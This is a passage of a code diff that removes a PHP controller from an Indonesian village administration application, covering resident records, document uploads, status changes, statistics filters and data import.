-        $data['list_dokumen'] = DokumenHidup::where(['id_pend' => $id])->get();
-        view('admin.penduduk.dokumen_ajax', $data);
-    }
-
-    public function dokumen_insert(): void
-    {
-        isCan('u');
-
-        try {
-            $dataInsert               = Dokumen::validasi($this->input->post());
-            $id_pend                  = $dataInsert['id_pend'];
-            $dataInsert['satuan']     = $this->upload_dokumen();
-            $dataInsert['updated_by'] = $this->session->user;
-            $dataInsert['created_by'] = $this->session->user;
-            $dokumen                  = Dokumen::create($dataInsert);
-
-            if ($dataInsert['anggota_kk']) {
-                foreach ($dataInsert['anggota_kk'] as $anggota) {
-                    $dataInsert['id_parent'] = $dokumen->id;
-                    $dataInsert['id_pend']   = $anggota;
-                    Dokumen::create($dataInsert);
-                }
-            }
-            redirect_with('success', 'Dokumen berhasil disimpan', ci_route('penduduk.dokumen', $id_pend));
-        } catch (Exception $e) {
-            log_message('error', $e->getMessage());
-            redirect_with('error', 'Dokumen gagal disimpan', ci_route('penduduk.dokumen', $id_pend));
-        }
-    }
-
-    public function dokumen_update(int $id): void
-    {
-        isCan('u');
-
-        try {
-            $dataUpdate               = Dokumen::validasi($this->input->post());
-            $dataUpdate['updated_by'] = $this->session->user;
-            if (isset($_FILES['satuan']) && $_FILES['satuan']['error'] == UPLOAD_ERR_OK) {
-                $dataUpdate['satuan'] = $this->upload_dokumen();
-            }
-            $anggotaKK = $dataUpdate['anggota_kk'] ?? [];
-            unset($dataUpdate['anggota_kk'], $dataUpdate['id_pend']);
-
-            $dokumen = Dokumen::find($id);
-            $dokumen->update($dataUpdate);
-
-            $id_pend = $dokumen->id_pend;
-
-            $dokumenLain      = $dokumen->children;
-            $anggotaLain      = $dokumenLain ? $dokumenLain->pluck('id_pend')->all() : [];
-            $intersectAnggota = array_intersect($anggotaKK, $anggotaLain);
-
-            foreach ($intersectAnggota as $value) {
-                $dokumen->children->firstWhere('id_pend', $value)->update($dataUpdate);
-            }
-
-            $diffDeleteAnggota = array_diff($anggotaLain, $anggotaKK);
-
-            foreach ($diffDeleteAnggota as $value) {
-                $dokumen->children->firstWhere('id_pend', $value)->delete();
-            }
-
-            $diffInsertAnggota = array_diff($anggotaKK, $anggotaLain);
-
-            foreach ($diffInsertAnggota as $value) {
-                $dataUpdate['id_parent'] = $dokumen->id;
-                $dataUpdate['id_pend']   = $value;
-                $dataUpdate['satuan']    = $dokumen->satuan;
-                Dokumen::create($dataUpdate);
-            }
-
-            redirect_with('success', 'Dokumen berhasil disimpan', ci_route('penduduk.dokumen', $id_pend));
-        } catch (Exception $e) {
-            log_message('error', $e->getMessage());
-            redirect_with('error', 'Dokumen gagal disimpan', ci_route('penduduk.dokumen', $id_pend));
-        }
-    }
-
-    public function delete_dokumen($id_pend, $id = null): void
-    {
-        isCan('h');
-
-        try {
-            Dokumen::whereIdPend($id_pend)->whereIn('id_parent', $this->request['id_cb'] ?? [$id])->delete();
-            Dokumen::destroy($this->request['id_cb'] ?? $id);
-            redirect_with('success', 'Area berhasil dihapus', ci_route('penduduk.dokumen', $id_pend));
-        } catch (Exception $e) {
-            log_message('error', $e->getMessage());
-            redirect_with('error', 'Area gagal dihapus', ci_route('penduduk.dokumen', $id_pend));
-        }
-    }
-
-    private function upload_dokumen()
-    {
-        $config['upload_path']   = LOKASI_DOKUMEN;
-        $config['allowed_types'] = 'jpg|jpeg|png|pdf';
-        $config['file_name']     = namafile($this->input->post('nama', true));
-
-        $this->load->library('upload');
-        $this->upload->initialize($config);
-
-        if (! $this->upload->do_upload('satuan')) {
-            session_error($this->upload->display_errors(null, null));
-
-            return false;
-        }
-
-        return $this->upload->data()['file_name'];
-    }
-
-    public function cetak_biodata($id = ''): void
-    {
-        $data['penduduk'] = PendudukModel::findOrFail($id);
-        view('admin.penduduk.cetak_biodata', $data);
-    }
-
-    public function insert($peristiwa): void
-    {
-        isCan('u');
-        $data                    = $this->input->post();
-        $originalInput           = $data;
-        $data['tgl_lapor']       = rev_tgl($data['tgl_lapor']);
-        $data['tgl_peristiwa']   = $data['tgl_peristiwa'] ? rev_tgl($data['tgl_peristiwa']) : rev_tgl($data['tanggallahir']);
-        $data['jenis_peristiwa'] = $peristiwa;
-        $validasiPenduduk        = PendudukModel::validasi($data);
-        if (! $validasiPenduduk['status']) {
-            set_session('old_input', $originalInput);
-            redirect_with('error', $validasiPenduduk['messages'], ci_route('penduduk.form_peristiwa', $data['jenis_peristiwa']));
-        }
-        unset($data['file_foto'], $data['old_foto'], $data['nik_lama'], $data['dusun'], $data['rw']);
-
-        DB::beginTransaction();
-
-        try {
-            $penduduk = PendudukModel::baru($data);
-            DB::commit();
-            redirect_with('success', 'Penduduk baru berhasil ditambahkan', ci_route('penduduk.detail', $penduduk->id));
-        } catch (Exception $e) {
-            log_message('error', $e->getMessage());
-            DB::rollBack();
-            set_session('old_input', $originalInput);
-            redirect_with('error', 'Penduduk baru gagal ditambahkan', ci_route('penduduk.form_peristiwa.' . $data['jenis_peristiwa']));
-        }
-    }
-
-    public function update($id = ''): void
-    {
-        isCan('u');
-        $data                  = $this->input->post();
-        $originalInput         = $data;
-        $data['tgl_lapor']     = rev_tgl($data['tgl_lapor']);
-        $data['tgl_peristiwa'] = $data['tgl_peristiwa'] ? rev_tgl($data['tgl_peristiwa']) : rev_tgl($data['tanggallahir']);
-        $validasiPenduduk      = PendudukModel::validasi($data, $id);
-        $penduduk              = PendudukModel::findOrFail($id);
-        if ($penduduk->status_dasar != StatusDasarEnum::HIDUP) {
-            set_session('old_input', $originalInput);
-            redirect_with('error', 'Data penduduk dengan status dasar MATI/HILANG/PINDAH tidak dapat diubah!', ci_route('penduduk.form_peristiwa', $id));
-        }
-        if (! $validasiPenduduk['status']) {
-            set_session('old_input', $originalInput);
-            redirect_with('error', $validasiPenduduk['messages'], ci_route('penduduk.form', $id));
-        }
-
-        unset($data['file_foto'], $data['old_foto'], $data['nik_lama'], $data['dusun'], $data['rw']);
-
-        DB::beginTransaction();
-
-        try {
-            $penduduk->ubah($data);
-            DB::commit();
-            redirect_with('success', 'Penduduk berhasil diubah', ci_route('penduduk.detail', $penduduk->id));
-        } catch (Exception $e) {
-            log_message('error', $e->getMessage());
-            DB::rollBack();
-            set_session('old_input', $originalInput);
-            redirect_with('error', 'Penduduk baru gagal diubah', ci_route('penduduk.form.', $penduduk->id));
-        }
-    }
-
-    public function delete($id = '', $semua = false): void
-    {
-        isCan('h');
-        if (data_lengkap()) {
-            redirect_with('error', 'Data tidak dapat proses karena sudah dinyatakan lengkap');
-        }
-        akun_demo($id);
-        $penduduk = PendudukModel::findOrFail($id);
-
-        if ($penduduk->pamongUser()->exists()) {
-            redirect_with('error', 'Tidak dapat menghapus penduduk karena sudah terdaftar sebagai pengguna.');
-        }
-
-        $bantuan = $penduduk->pesertaBantuan()->get();
-
-        if ($bantuan->isNotEmpty()) {
-            $links = $bantuan->map(
-                static fn ($item) => '<li><a href="' . ci_route("peserta_bantuan.detail.{$item->program_id}") .
-                '" target="_blank">' . $item->bantuan->nama . '</a></li>'
-            )->implode('');
-
-            $links = "<ul>{$links}</ul>";
-
-            redirect_with('error', "Tidak dapat menghapus penduduk karena sudah terdaftar sebagai peserta bantuan: {$links}", '', true);
-        }
-
-        if ($penduduk->logSurat()->exists()) {
-            redirect_with('error', 'Tidak dapat menghapus penduduk karena sudah terdaftar di Arsip Layanan Surat.');
-        }
-
-        $penduduk->delete();
-
-        if (! $semua) {
-            redirect_with('success', 'Penduduk berhasil dihapus', ci_route('penduduk'));
-        }
-    }
-
-    public function delete_all(): void
-    {
-        isCan('h');
-
-        foreach ($this->request['id_cb'] as $id) {
-            $this->delete($id, true);
-        }
-
-        redirect_with('success', 'Penduduk berhasil dihapus', ci_route('penduduk'));
-    }
-
-    public function ajax_adv_search(): void
-    {
-        $listSearch = $this->session->userdata('advance_search');
-
-        foreach ($listSearch as $key => $item) {
-            $data[$key] = $item;
-        }
-
-        $data['input_umur']           = true;
-        $data['list_agama']           = AgamaEnum::all();
-        $data['list_pendidikan']      = PendidikanSedangEnum::all();
-        $data['list_pendidikan_kk']   = PendidikanKKEnum::all();
-        $data['list_pekerjaan']       = PekerjaanEnum::all();
-        $data['list_status_kawin']    = StatusKawinSpesifikEnum::all();
-        $data['list_status_penduduk'] = StatusPendudukEnum::all();
-        $data['list_sex']             = JenisKelaminEnum::all();
-        $data['list_status_dasar']    = StatusDasarEnum::all();
-        $data['list_cacat']           = CacatEnum::all();
-        $data['list_cara_kb']         = CaraKBEnum::all();
-        $data['list_status_ktp']      = StatusKTPEnum::all();
-        $data['list_asuransi']        = AsuransiEnum::all();
-        $data['list_warganegara']     = WargaNegaraEnum::all();
-        $data['list_golongan_darah']  = GolonganDarahEnum::all();
-        $data['list_sakit_menahun']   = SakitMenahunEnum::all();
-        $data['list_tag_id_card']     = StatusEnum::all();
-        $data['list_id_kk']           = StatusEnum::all();
-        $data['form_action']          = ci_route('penduduk.adv_search_proses');
-
-        view('admin.penduduk.ajax_adv_search_form', $data);
-    }
-
-    public function adv_search_proses(): void
-    {
-        $this->advanceSearch = $this->validasi_pencarian($this->input->post());
-        $this->index();
-    }
-
-    private function validasi_pencarian($post)
-    {
-        $data['umur']                 = $post['umur'];
-        $data['umur_min']             = bilangan($post['umur_min']);
-        $data['umur_max']             = bilangan($post['umur_max']);
-        $data['pekerjaan_id']         = $post['pekerjaan_id'];
-        $data['status']               = $post['status'];
-        $data['status_kawin']         = $post['status_kawin'];
-        $data['agama']                = $post['agama'];
-        $data['pendidikan_sedang_id'] = $post['pendidikan_sedang_id'];
-        $data['pendidikan_kk_id']     = $post['pendidikan_kk_id'];
-        $data['status_penduduk']      = $post['status_penduduk'];
-        $data['filter']               = $post['status_penduduk'];
-        $data['sex']                  = $post['sex'];
-        $data['status_dasar']         = $post['status_dasar'];
-        $data['cara_kb_id']           = $post['cara_kb_id'];
-        $data['status_ktp']           = $post['status_ktp'];
-        $data['id_asuransi']          = $post['id_asuransi'];
-        $data['warganegara']          = $post['warganegara'];
-        $data['golongan_darah']       = $post['golongan_darah'];
-        $data['menahun']              = $post['menahun'];
-        $data['cacat']                = $post['cacat'];
-        $data['tag_id_card']          = $post['tag_id_card'];
-        $data['id_kk']                = $post['id_kk'];
-
-        return $data;
-    }
-
-    public function ajax_penduduk_maps($id = null, $edit = '1'): void
-    {
-        isCan('u');
-        $penduduk = PendudukModel::withOnly(['keluarga', 'rtm', 'map'])->findOrFail($id);
-
-        if ($penduduk->map === null && $edit !== '2') {
-            redirect(ci_route("penduduk.ajax_penduduk_maps.{$id}.2"));
-        }
-
-        $data['id']       = $id;
-        $data['edit']     = $edit;
-        $data['penduduk'] = ['nama' => $penduduk->nama, 'status_dasar' => $penduduk->status_dasar];
-        if ($penduduk->lokasi) {
-            $data['penduduk'] = array_merge($penduduk->lokasi->toArray(), $data['penduduk']);
-        } elseif ($penduduk->map) {
-            $data['penduduk'] = array_merge($penduduk->map->toArray(), $data['penduduk']);
-        }
-        $data['wil_atas']    = $this->header['desa'];
-        $data['dusun_gis']   = Wilayah::dusun()->get()->toArray();
-        $data['rw_gis']      = Wilayah::rw()->get()->toArray();
-        $data['rt_gis']      = Wilayah::rt()->get()->toArray();
-        $data['form_action'] = ci_route("penduduk.update_maps.{$id}.{$data['edit']}");
-
-        view('admin.penduduk.ajax_penduduk_maps', $data);
-    }
-
-    public function update_maps($id = '', $edit = ''): void
-    {
-        isCan('u');
-
-        $penduduk = PendudukSaja::findOrFail($id);
-
-        if ($penduduk->status_dasar != StatusDasarEnum::HIDUP) {
-            redirect_with('error', 'Data penduduk dengan status dasar MATI/HILANG/PINDAH tidak dapat diubah!', ci_route("penduduk.ajax_penduduk_maps.{$id}.{$edit}"));
-        }
-        $data = $_POST;
-        unset($data['zoom'], $data['map_tipe']);
-        $map      = $penduduk->map ?? new PendudukMap(['id' => $penduduk->id]);
-        $map->lat = $data['lat'];
-        $map->lng = $data['lng'];
-        $map->save();
-
-        // jika penduduk adalah kepala keluarga maka ubah anggota keluarga lainnya
-        if ($penduduk->isKepalaKeluarga()) {
-            $anggotaKeluarga = PendudukSaja::with(['map'])->status(StatusDasarEnum::HIDUP)->where('id_kk', $penduduk->id_kk)->where('id', '!=', $penduduk->id)->get();
-            if (! $anggotaKeluarga->isEmpty()) {
-                foreach ($anggotaKeluarga as $anggota) {
-                    $mapAnggota      = $anggota->map ?? new PendudukMap(['id' => $anggota->id]);
-                    $mapAnggota->lat = $data['lat'];
-                    $mapAnggota->lng = $data['lng'];
-                    $mapAnggota->save();
-                }
-            }
-        }
-
-        set_session('success', 'Data berhasil disimpan');
-
-        if ($edit == 1) {
-            redirect(ci_route("penduduk.form.{$id}"));
-        } else {
-            redirect(ci_route('penduduk'));
-        }
-    }
-
-    public function edit_status_dasar($id = 0, $url = '', $parrent = ''): void
-    {
-        isCan('u');
-        if (! data_lengkap()) {
-            session_error('Data tidak dapat proses karena sudah dinyatakan lengkap');
-
-            redirect(ci_route('penduduk'));
-        }
-
-        $data['nik']             = PendudukModel::with('keluarga.anggota')->findOrFail($id);
-        $data['form_action']     = ci_route('penduduk.update_status_dasar', [$id, $url, $parrent]);
-        $data['list_ref_pindah'] = PindahEnum::all();
-        $data['sebab']           = unserialize(SEBAB);
-        $data['penolong_mati']   = unserialize(PENOLONG_MATI);
-
-        // pengecualian kk level kepala keluarga
-        $excludeStatusMati = $data['nik']['kk_level'] == SHDKEnum::KEPALA_KELUARGA
-            && $data['nik']?->keluarga?->anggota?->count() > 1
-            ? StatusDasarEnum::MATI
-            : null;
-
-        // pengecualian status dasar: Penduduk Tetap => ('TIDAK VALID', 'HIDUP', 'PERGI') , Penduduk Tidak Tetap => ('TIDAK VALID', 'HIDUP')
-        $excludeStatus = $data['nik']['status'] == StatusPendudukEnum::TETAP
-            ? [StatusDasarEnum::TIDAK_VALID, StatusDasarEnum::HIDUP, StatusDasarEnum::PERGI, $excludeStatusMati]
-            : [StatusDasarEnum::TIDAK_VALID, StatusDasarEnum::HIDUP, $excludeStatusMati];
-
-        $data['list_status_dasar'] = collect(StatusDasarEnum::all())->filter(static fn ($key, $item) => ! in_array($item, $excludeStatus))->all();
-        view('admin.penduduk.ajax_edit_status_dasar', $data);
-    }
-
-    public function update_status_dasar($id = '', $url = '', $parrent = ''): void
-    {
-        isCan('u');
-        if (! data_lengkap()) {
-            redirect_with('error', 'Data tidak dapat proses karena sudah dinyatakan lengkap', ci_route('penduduk'));
-        }
-        akun_demo($id);
-
-        $data['kelahiran_anak_ke'] = (int) $this->input->post('anak_ke');
-        $data['status_dasar']      = $this->input->post('status_dasar');
-        $penduduk                  = PendudukModel::findOrFail($id);
-        $penduduk->status_dasar    = $data['status_dasar'];
-        $penduduk->save();
-        // Tulis log_penduduk
-        $log = [
-            'config_id'      => identitas('id'),
-            'id_pend'        => $id,
-            'no_kk'          => $penduduk->keluarga->no_kk ?? '',
-            'nama_kk'        => $penduduk->keluarga->kepalaKeluarga->nama ?? '',
-            'tgl_peristiwa'  => rev_tgl($this->input->post('tgl_peristiwa')),
-            'tgl_lapor'      => rev_tgl($this->input->post('tgl_lapor')),
-            'kode_peristiwa' => $data['status_dasar'],
-            'catatan'        => alfanumerik_spasi($this->input->post('catatan')),
-            'meninggal_di'   => alfanumerik_spasi($this->input->post('meninggal_di')),
-            'jam_mati'       => $this->input->post('jam_mati'),
-            'sebab'          => (int) ($this->input->post('sebab')),
-            'penolong_mati'  => (int) ($this->input->post('penolong_mati')),
-            'akta_mati'      => $this->input->post('akta_mati'),
-            'created_by'     => ci_auth()->id,
-        ];
-
-        if ($log['kode_peristiwa'] == 2 && ! empty($_FILES['nama_file']['name'])) {
-            $log['file_akta_mati'] = $this->upload_akta_mati($id);
-        }
-
-        if ($log['kode_peristiwa'] == 3) {
-            $pindah               = $this->input->post('ref_pindah');
-            $log['ref_pindah']    = empty($pindah) ? 1 : $pindah;
-            $log['alamat_tujuan'] = $this->input->post('alamat_tujuan');
-        }
-        $penduduk->log()->upsert($log, ['config_id', 'kode_peristiwa', 'tgl_peristiwa', 'id_pend']);
-
-        // Tulis log_keluarga jika penduduk adalah kepala keluarga
-        if ($penduduk->kk_level == SHDKEnum::KEPALA_KELUARGA && $penduduk->id_kk) {
-            $id_peristiwa = $penduduk->status_dasar; // lihat kode di keluarga_model
-            $log_keluarga = [
-                'id_kk'           => $penduduk->id_kk,
-                'id_peristiwa'    => $id_peristiwa,
-                'tgl_peristiwa'   => date('Y-m-d H:i:s'),
-                'id_pend'         => null,
-                'id_log_penduduk' => LogPenduduk::where(['kode_peristiwa' => $log['kode_peristiwa'], 'id_pend' => $penduduk->id, 'tgl_peristiwa' => $log['tgl_peristiwa']])->first()->id ?? null,
-                'updated_by'      => ci_auth()->id,
-            ];
-            LogKeluarga::create($log_keluarga);
-        }
-
-        if (! empty($url)) {
-            if ($url == 'keluarga.anggota') {
-                $url = ci_route($url, $parrent);
-            }
-            redirect_with('success', 'Status dasar penduduk berhasil diubah', $url);
-        } else {
-            redirect("{$this->controller}");
-        }
-    }
-
-    private function upload_akta_mati($id)
-    {
-        $this->load->library('upload');
-
-        $config = [
-            'upload_path'   => LOKASI_DOKUMEN,
-            'allowed_types' => 'jpg|jpeg|png|pdf',
-            'max_size'      => 1024 * 10,
-            'file_name'     => 'akta_mati_' . $id . '_' . time(),
-        ];
-
-        $this->upload->initialize($config);
-
-        if (! $this->upload->do_upload('nama_file')) {
-            session_error($this->upload->display_errors());
-            redirect($this->controller);
-        }
-
-        $uploadData = $this->upload->data();
-
-        return $uploadData['file_name'];
-    }
-
-    public function kembalikan_status($id = ''): void
-    {
-        isCan('u');
-        $penduduk               = PendudukModel::findOrFail($id);
-        $penduduk->status_dasar = StatusDasarEnum::HIDUP;
-        $penduduk->save();
-
-        // Jika peristiwa lahir akan mengambil data dari field tanggal lahir
-        $x = [
-            'tgl_peristiwa'  => Carbon::now(),
-            'kode_peristiwa' => LogPenduduk::BARU_PINDAH_MASUK,
-            'tgl_lapor'      => Carbon::now(),
-            'created_by'     => ci_auth()->id,
-        ];
-
-        $penduduk->log()->create($x);
-        redirect('penduduk');
-    }
-
-    public function cetak($aksi = 'cetak', $privasi_nik = 0): void
-    {
-        $query = datatables($this->sumberData())
-            ->filter(function ($query) {
-                $query->when($this->input->post('id_cb'), static function ($query, $id) {
-                    $query->whereIn('id', $id);
-                });
-            });
-
-        $data = [
-            'main'  => $query->prepareQuery()->results(),
-            'start' => app('datatables.request')->start(),
-            'judul' => $this->input->post('judul'),
-        ];
-        if ($privasi_nik == 1) {
-            $data['privasi_nik'] = true;
-        }
-        if ($aksi == 'unduh') {
-            header('Content-type: application/octet-stream');
-            header('Content-Disposition: attachment; filename=Penduduk_' . date('Ymd') . '.xls');
-            header('Pragma: no-cache');
-            header('Expires: 0');
-        }
-        view('admin.penduduk.cetak', $data);
-    }
-
-    public function statistik($tipe = '0', $nomor = 0, $sex = null): void
-    {
-        $this->statistikFilter['status_dasar'] = StatusDasarEnum::HIDUP;
-        $dusun                                 = $this->input->get('dusun') ?? null;
-        $rw                                    = $this->input->get('rw') ?? null;
-        $rt                                    = $this->input->get('rt') ?? null;
-        $idCluster                             = $this->input->get('idCluster') ?? null;
-
-        if (! empty($dusun)) {
-            $this->statistikFilter['dusun'] = $dusun;
-        }
-        if (! empty($rw)) {
-            $this->statistikFilter['rw'] = $dusun . '__' . $rw;
-        }
-        if (! empty($rt)) {
-            $this->statistikFilter['rt'] = $rt;
-        }
-        if (! empty($sex)) {
-            $this->statistikFilter['sex'] = $sex;
-        }
-
-        switch ($tipe) {
-            case '0':
-                $session  = 'pendidikan_kk_id';
-                $kategori = 'PENDIDIKAN DALAM KK : ';
-                break;
-
-            case 1:
-                $session  = 'pekerjaan_id';
-                $kategori = 'PEKERJAAN : ';
-                break;
-
-            case 2:
-                $session  = 'status_kawin';
-                $kategori = 'STATUS PERKAWINAN : ';
-                break;
-
-            case 3:
-                $session  = 'agama';
-                $kategori = 'AGAMA : ';
-                break;
-
-            case 4:
-                $session  = 'sex';
-                $kategori = 'JENIS KELAMIN : ';
-                break;
-
-            case 5:
-                $session  = 'warganegara';
-                $kategori = 'WARGANEGARA : ';
-                break;
-
-            case 6:
-                $session  = 'status_penduduk';
-                $kategori = 'STATUS PENDUDUK : ';
-                break;
-
-            case 7:
-                $session  = 'golongan_darah';
-                $kategori = 'GOLONGAN DARAH : ';
-                break;
-
-            case 9:
-                $session  = 'cacat';
-                $kategori = 'CACAT : ';
-                break;
-
-            case 10:
-                $session  = 'menahun';
-                $kategori = 'SAKIT MENAHUN : ';
-                break;
-
-            case 13:
-                $session  = 'umurx';
-                $kategori = 'UMUR (RENTANG) : ';
-                break;
-
-            case 14:
-                $session  = 'pendidikan_sedang_id';
-                $kategori = 'PENDIDIKAN SEDANG DITEMPUH : ';
-                break;
-
-            case 15:
-                $session  = 'umurx';
-                $kategori = 'UMUR (KATEGORI) : ';
-                break;
-
-            case 16:
-                $session  = 'cara_kb_id';
-                $kategori = 'CARA KB : ';
-                break;
-
-            case 17:
-                $session  = 'akta_kelahiran';
-                $kategori = 'AKTA KELAHIRAN : UMUR ';
-                break;
-
-            case 19:
-                $session  = 'id_asuransi';
-                $kategori = 'ASURANSI KESEHATAN : ';
-                break;
-
-            case 'bpjs-tenagakerja':
-                // $session  = ($nomor == BELUM_MENGISI || $nomor == JUMLAH) ? 'bpjs_ketenagakerjaan' : 'pekerjaan_id';
-                $session  = 'bpjs_ketenagakerjaan';
-                $kategori = 'BPJS Ketenagakerjaan : ';
-                // $this->session->bpjs_ketenagakerjaan = $nomor != TOTAL;
-                break;
-
-            case 'status-asuransi-kesehatan':
-                $session  = 'status_asuransi_kesehatan';
-                $kategori = 'Status Kepersertaan Asuransi Kesehatan : ';
-                break;
-
-            case 'hubungan_kk':
-                $session  = 'hubungan';
-                $kategori = 'HUBUNGAN DALAM KK : ';
-                break;
-
-            case 'covid':
-                $session  = 'status_covid';
-                $kategori = 'STATUS COVID : ';
-                break;
-
-            case 'bantuan_penduduk':
-                if (! in_array($nomor, [BELUM_MENGISI, TOTAL])) {
-                    $this->statistikFilter['status_dasar'] = null;
-                } // tampilkan semua peserta walaupun bukan hidup/aktif
-                $session  = 'bantuan_penduduk';
-                $kategori = 'PENERIMA BANTUAN PENDUDUK : ';
-                break;
-
-            case 18:
-                if ($sex == null) {
-                    $this->statistikFilter['status_ktp'] = 0;
-                    $this->statistikFilter['sex']        = ($nomor == 0) ? null : $nomor;
-                    $sex                                 = $this->statistikFilter['sex'];
-                    unset($nomor);
-                } else {
-                    $this->statistikFilter['status_ktp'] = $nomor;
-                }
-
-                $kategori = 'KEPEMILIKAN WAJIB KTP : ';
-                break;
-
-            case 'suku':
-                $session  = 'suku';
-                $kategori = 'Suku : ';
-                break;
-
-            case 'hamil':
-                $session  = 'hamil';
-                $kategori = 'STATUS KEHAMILAN : ';
-                break;
-
-            case 'buku-nikah':
-                $session  = 'buku-nikah';
-                $kategori = 'STATUS PERKAWINAN : ';
-                break;
-
-            case 'kia':
-                $session  = 'kia';
-                $kategori = 'KEPEMILIKAN KIA : ';
-                break;
-
-            case $tipe > 50:
-                $program_id = preg_replace('/^50/', '', $tipe);
-
-                $this->statistikFilter['program_bantuan'] = $program_id;
-
-                // TODO: Sederhanakan query ini, pindahkan ke model
-                $nama = Bantuan::find($program_id)->nama ?? '-';
-                if (! in_array($nomor, [BELUM_MENGISI, TOTAL])) {
-                    $nomor = $program_id;
-                }
-                $kategori = $nama . ' : ';
-                $session  = 'bantuan_penduduk';
-                $tipe     = 'bantuan_penduduk';
-                break;
-        }
-
-        // Filter berdasarkan kategori tdk dilakukan jika $nomer = TOTAL (888)
-        if ($tipe != 18 && $nomor != TOTAL) {
-            $this->statistikFilter[$session] = rawurldecode($nomor);
-        }
-        // pengecualian untuk kia dan 18
-        if (in_array($tipe, ['18', 'kia', 'buku-nikah'])) {
-            $this->statistikFilter[$session] = rawurldecode($nomor);
-        }
-
-        $judul = $this->get_judul_statistik($tipe, $nomor, $sex);
-        // Laporan wajib KTP berbeda - menampilkan sebagian dari penduduk, jadi selalu perlu judul
-        if ($judul['nama'] || $tipe = 18) {
-            $this->judulStatistik = $kategori . $judul['nama'];
-        }
-
-        $this->index();
-    }
-
-    public function lap_statistik($id_cluster = 0, $tipe = 0, $nomor = 0): void
-    {
-        $this->statistikFilter['id_cluster'] = $id_cluster;
-        if ($nomor) {
-            $this->statistikFilter['sex'] = $nomor;
-        }
-
-        switch ($tipe) {
-            case 1:
-                $this->statistikFilter['sex'] = '1';
-                $pre                          = 'JENIS KELAMIN LAKI-LAKI  ';
-                break;
-
-            case 2:
-                $this->statistikFilter['sex'] = '2';
-                $pre                          = 'JENIS KELAMIN PEREMPUAN ';
-                break;
-
-            case 3:
-                $this->statistikFilter['umur_min'] = '0';
-                $this->statistikFilter['umur_max'] = '0';
-                $pre                               = 'BERUMUR <1 ';
-                break;
-
-            case 4:
-                $this->statistikFilter['umur_min'] = '1';
-                $this->statistikFilter['umur_max'] = '5';
-                $pre                               = 'BERUMUR 1-5 ';
-                break;
-
-            case 5:
-                $this->statistikFilter['umur_min'] = '6';
-                $this->statistikFilter['umur_max'] = '12';
-                $pre                               = 'BERUMUR 6-12 ';
-                break;
-
-            case 6:
-                $this->statistikFilter['umur_min'] = '13';
-                $this->statistikFilter['umur_max'] = '15';
-
-                $pre = 'BERUMUR 13-16 ';
-                break;
-
-            case 7:
-                $this->statistikFilter['umur_min'] = '16';
-                $this->statistikFilter['umur_max'] = '18';
-
-                $pre = 'BERUMUR 16-18 ';
-                break;
-
-            case 8:
-                $this->statistikFilter['umur_min'] = '61';
-                $this->statistikFilter['umur_max'] = '9999';
-                $pre                               = 'BERUMUR >60';
-                break;
-
-            case 91:
-            case 92:
-            case 93:
-            case 94:
-            case 95:
-            case 96:
-            case 97:
-                $kode_cacat                     = $tipe - 90;
-                $this->statistikFilter['cacat'] = $kode_cacat;
-
-                $stat = $this->get_judul_statistik(9, $kode_cacat, null);
-                $pre  = $stat['nama'];
-                break;
-
-            case 10:
-                $this->statistikFilter['menahun'] = array_diff(SakitMenahunEnum::keys(), [SakitMenahunEnum::TIDAK_ADA_TIDAK_SAKIT]);
-                $this->statistikFilter['sex']     = '1';
-                $pre                              = 'SAKIT MENAHUN LAKI-LAKI ';
-                break;
-
-            case 11:
-                $this->statistikFilter['menahun'] = array_diff(SakitMenahunEnum::keys(), [SakitMenahunEnum::TIDAK_ADA_TIDAK_SAKIT]);
-                $this->statistikFilter['sex']     = '2';
-                $pre                              = 'SAKIT MENAHUN PEREMPUAN ';
-                break;
-
-            case 12:
-                $this->statistikFilter['hamil'] = '1';
-                $pre                            = 'HAMIL ';
-                break;
-        }
-
-        if ($pre) {
-            $this->judulStatistik = $pre;
-        }
-
-        $this->index();
-    }
-
-    public function search_kumpulan_nik(): void
-    {
-        view('admin.penduduk.modal.kumpulan_nik');
-    }
-
-    public function ajax_cetak(string $aksi = 'cetak'): void
-    {
-        $data['aksi']   = $aksi;
-        $data['action'] = ci_route('penduduk.cetak', $aksi);
-
-        view('admin.penduduk.ajax_cetak_bersama', $data);
-    }
-
-    public function program_bantuan(): void
-    {
-        $data = [
-            'program_bantuan' => Bantuan::whereSasaran(SasaranEnum::PENDUDUK)->get(),
-        ];
-
-        view('admin.penduduk.modal.program_bantuan', $data);
-    }
-
-    /**
-     * Unduh berkas berdasarkan kolom dokumen.id
-     *
-     * @param int   $id_dokumen Id berkas pada koloam dokumen.id
-     * @param mixed $tampil
-     */
-    public function unduh_berkas($id_dokumen = 0, $tampil = false): void
-    {
-        // Ambil nama berkas dari database
-        $data = DokumenHidup::findOrFail($id_dokumen);
-        ambilBerkas($data['satuan'], $this->controller . '/dokumen/' . $data['id_pend'], null, LOKASI_DOKUMEN, $tampil);
-    }
-
-    public function impor()
-    {
-        if (config_item('demo_mode') || data_lengkap()) {
-            $msg = 'Tidak dapat melakukan impor pada mode demo atau data sudah dinyatakan lengkap';
-            redirect_with('error', $msg);
-        }
-
-        isCan('u');
-
-        $data = [
-            'form_action'          => ci_route('penduduk.proses_impor'),
-            'boleh_hapus_penduduk' => PendudukSaja::bolehHapusPenduduk(),
-            'formatImpor'          => ci_route('unduh', encrypt(DEFAULT_LOKASI_IMPOR . 'format-impor-excel.xlsm')),
-        ];
-
-        return view('admin.penduduk.impor', $data);
-    }
-
-    public function proses_impor(): void
-    {
-        if (config_item('demo_mode') || data_lengkap()) {
-            redirect($this->controller);
-        }
-
-        isCan('u');
-        $hapus = isset($_POST['hapus_data']);
-        (new Import())->imporExcel($hapus);
-        shortcut_cache();
-        redirect('penduduk/impor');
-    }
-
-    public function impor_bip()
-    {
-        if (config_item('demo_mode') || setting('multi_desa') || data_lengkap()) {
-            redirect($this->controller);
-        }
-
-        isCan('u');
-
-        $data = [
-            'form_action'          => ci_route('penduduk.proses_impor_bip'),
-            'boleh_hapus_penduduk' => PendudukSaja::bolehHapusPenduduk(),
-            'formatBip2012'        => ci_route('unduh', encrypt(DEFAULT_LOKASI_IMPOR . 'format-bip-2012.xls')),
-            'formatBip2016'        => ci_route('unduh', encrypt(DEFAULT_LOKASI_IMPOR . 'format-bip-2016.xls')),
-            'formatBipEktp'        => ci_route('unduh', encrypt(DEFAULT_LOKASI_IMPOR . 'format-bip-ektp.xls')),
-            'formatBip2016Lutim'   => ci_route('unduh', encrypt(DEFAULT_LOKASI_IMPOR . 'format-bip-2016-luwutimur.xls')),
-            'formatBipSiak'        => ci_route('unduh', encrypt(DEFAULT_LOKASI_IMPOR . 'format-siak.xls')),
-        ];
-
-        return view('admin.penduduk.impor_bip', $data);
-    }
-
-    public function proses_impor_bip(): void
-    {
